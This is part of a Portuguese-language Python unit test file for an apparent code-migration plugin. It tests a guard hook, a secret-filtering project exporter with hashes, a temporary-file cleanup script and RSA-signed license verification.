        return run(RAIZ / "hooks/portao_g0.py", entrada=json.dumps({"tool_name": "Write", "tool_input": {"file_path": str(tmp / arquivo)}, "cwd": str(tmp)}))

    def test_nega_fora_do_wx_migration_quando_blocked(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            run_dir = tmp / ".wx-migration/preflight/runs/run-1"; run_dir.mkdir(parents=True)
            (run_dir / "report.json").write_text(json.dumps({"status": "BLOCKED", "summary": {"errors": 3}}))
            r = self.hook(tmp, "src/main.rs"); self.assertIn('"deny"', r.stdout)
            r = self.hook(tmp, ".wx-migration/gaps.md"); self.assertEqual(r.stdout, "")
            (run_dir / "report.json").write_text(json.dumps({"status": "READY"}))
            r = self.hook(tmp, "src/main.rs"); self.assertEqual(r.stdout, "")
        finally:
            shutil.rmtree(tmp, ignore_errors=True)



class ExportarEZelador(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        shutil.copytree(EXEMPLO / "inputs", self.tmp / "inputs"); (self.tmp / ".wx-migration").mkdir()
        shutil.copy(EXEMPLO / "questionario.json", self.tmp / ".wx-migration" / "questionario.json")
        run(SCRIPTS / "aplicar_questionario.py", "--questionario", self.tmp / ".wx-migration/questionario.json", "--project-root", self.tmp, "--plugin-root", RAIZ)
        run(SCRIPTS / "pmo.py", "--project-root", self.tmp, "iniciar")

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_exporta_organizado_sem_segredos_e_com_hashes(self):
        cod = self.tmp / "estoque-rs"; (cod / "src").mkdir(parents=True); (cod / "target").mkdir()
        (cod / "src/main.rs").write_text("fn main(){}"); (cod / ".env").write_text("X=1"); (cod / "target/app").write_text("bin")
        (cod / "config.txt").write_text("T=ghp_abcdefghijklmnopqrstuvwxyz0123456789")
        saida = Path(tempfile.mkdtemp())
        r = run(SCRIPTS / "exportar_projeto.py", "--project-root", self.tmp, "--destino", saida, "--codigo", cod)
        self.assertEqual(r.returncode, 0, r.stderr); raiz = next(saida.iterdir())
        for pasta in ("01-questionario", "02-evidencias", "03-inventario-e-decisoes", "04-pmo", "05-ambiente-e-prompts", "06-codigo", "07-relatorio-final"):
            self.assertTrue((raiz / pasta).is_dir(), pasta)
        self.assertTrue((raiz / "06-codigo/src/main.rs").is_file()); self.assertFalse((raiz / "06-codigo/.env").exists()); self.assertFalse((raiz / "06-codigo/target").exists())
        self.assertFalse((raiz / "06-codigo/config.txt").exists())
        m = json.loads((raiz / "manifesto.json").read_text())
        self.assertEqual(m["recusados_por_segredo"], ["estoque-rs/config.txt"])
        um = next(x for x in m["arquivos"] if x["arquivo"].endswith("06-codigo/src/main.rs"))
        import hashlib; self.assertEqual(um["sha256"], hashlib.sha256(b"fn main(){}").hexdigest())
        self.assertTrue((raiz / "05-ambiente-e-prompts/ambiente/.env.exemplo").is_file())  # achado de sessao real: o regex de .env pegava o exemplo
        self.assertTrue((raiz / "02-evidencias/hashes.json").is_file()); self.assertFalse((raiz / "02-evidencias/banco.sql").exists())
        self.assertIn("| `06-codigo/` |", (raiz / "00-LEIA-ME.md").read_text())
        r = run(SCRIPTS / "exportar_projeto.py", "--project-root", self.tmp, "--destino", saida, "--codigo", cod)
        self.assertEqual(r.returncode, 2); self.assertIn("já existe", r.stderr)
        r = run(SCRIPTS / "exportar_projeto.py", "--project-root", self.tmp, "--destino", self.tmp / "dentro")
        self.assertEqual(r.returncode, 2); self.assertIn("dentro do projeto", r.stderr)
        shutil.rmtree(saida, ignore_errors=True)

    def test_zelador_limpa_so_temporarios_e_uma_vez_por_dia(self):
        import time
        runs = self.tmp / ".wx-migration/preflight/runs"
        for i in range(5):
            d = runs / f"run-{i}"; d.mkdir(parents=True); (d / "report.json").write_text("{}")
            os.utime(d, (time.time() - 30 * 86400, time.time() - 30 * 86400))
        logs = self.tmp / ".wx-migration/logs"; logs.mkdir()
        (logs / "velho.log").write_text("x"); os.utime(logs / "velho.log", (time.time() - 10 * 86400,) * 2)
        (logs / "novo.log").write_text("x")
        (self.tmp / "src").mkdir(); (self.tmp / "src/__pycache__").mkdir(); (self.tmp / "src/__pycache__/a.pyc").write_text("x")
        r = run(SCRIPTS / "zelador.py", "--project-root", self.tmp, "limpar")
        self.assertIn("só relatório", r.stdout); self.assertTrue((logs / "velho.log").exists())
        r = run(SCRIPTS / "zelador.py", "--project-root", self.tmp, "limpar", "--executar")
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertFalse((logs / "velho.log").exists()); self.assertTrue((logs / "novo.log").exists())
        self.assertEqual(sorted(p.name for p in runs.iterdir()), ["run-2", "run-3", "run-4"])
        self.assertFalse((self.tmp / "src/__pycache__").exists())
        self.assertTrue((self.tmp / "inputs/banco.sql").exists()); self.assertTrue((self.tmp / ".wx-migration/pmo/plano.json").exists())
        self.assertIn("| apagou |", (logs / "zelador.md").read_text())
        r = run(SCRIPTS / "zelador.py", "--project-root", self.tmp, "limpar", "--se-vencido")
        self.assertIn("já rodou hoje", r.stdout)
        r = run(SCRIPTS / "zelador.py", "--project-root", self.tmp, "hook-sessao"); self.assertEqual(r.stdout, "")


class Licenca(unittest.TestCase):
    """Serial RSA: o plugin so tem a chave publica e nao forja serial."""

    @classmethod
    def setUpClass(cls):
        sys.path.insert(0, str(SCRIPTS))
        import licenca
        cls.lic = licenca
        cls.priv, cls.pub = licenca.gerar_chaves()

    def test_serial_valido_alterado_vencido_e_de_outra_maquina(self):
        from datetime import date
        L = self.lic
        s = L.gerar_serial("Softhouse X", "2099-01-01", self.priv)
        self.assertEqual(L.verificar_serial(s, self.pub)["status"], "valida")
        self.assertEqual(L.verificar_serial(s[:-2] + ("A" if s[-2] != "A" else "B") + s[-1], self.pub)["status"], "assinatura-invalida")
        payload_alterado = s.split(".")[1][:-1] + ("A" if s.split(".")[1][-1] != "A" else "B")
        self.assertNotEqual(L.verificar_serial(".".join([s.split(".")[0], payload_alterado, s.split(".")[2]]), self.pub)["status"], "valida")
        self.assertEqual(L.verificar_serial(L.gerar_serial("X", "2000-01-01", self.priv), self.pub)["status"], "vencida")
        self.assertEqual(L.verificar_serial(L.gerar_serial("X", "2099-01-01", self.priv, maquina="0000000000000000"), self.pub)["status"], "maquina-diferente")
        self.assertEqual(L.verificar_serial(L.gerar_serial("X", "2099-01-01", self.priv, maquina=L.impressao_da_maquina()), self.pub)["status"], "valida")
        outra_priv, _ = L.gerar_chaves()
        self.assertEqual(L.verificar_serial(L.gerar_serial("X", "2099-01-01", outra_priv), self.pub)["status"], "assinatura-invalida")

    def test_hook_nega_scripts_do_plugin_sem_licenca_e_libera_com(self):
        tmp = Path(tempfile.mkdtemp())
        try:
            (tmp / "chave-publica.json").write_text(json.dumps(self.pub))
            env = dict(os.environ, WX_LICENCA=str(tmp / "licenca"))
            def hook(entrada):
                return subprocess.run([sys.executable, "-c", f"import sys; sys.path.insert(0, {str(SCRIPTS)!r}); import licenca; from pathlib import Path; licenca.CHAVE_PUBLICA = Path({str(tmp / 'chave-publica.json')!r}); sys.exit(licenca.hook_pre_tool())"], input=json.dumps(entrada), capture_output=True, text=True, env=env).stdout
            plugin = {"tool_name": "Bash", "tool_input": {"command": "python3 x/skills/conversao-wx/scripts/pmo.py status"}}
            self.assertIn('"deny"', hook(plugin))
            self.assertIn('"deny"', hook({"tool_name": "Write", "tool_input": {"file_path": "/p/.wx-migration/gaps.md"}}))
            self.assertEqual(hook({"tool_name": "Bash", "tool_input": {"command": "cargo test"}}), "")
            self.assertEqual(hook({"tool_name": "Write", "tool_input": {"file_path": "/p/src/main.rs"}}), "")
            (tmp / "licenca").write_text(self.lic.gerar_serial("Softhouse X", "2099-01-01", self.priv))
            self.assertEqual(hook(plugin), "")
            (tmp / "licenca").write_text(self.lic.gerar_serial("Softhouse X", "2000-01-01", self.priv))
            self.assertIn("vencida", hook(plugin))
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


if __name__ == "__main__":
    unittest.main(verbosity=1)
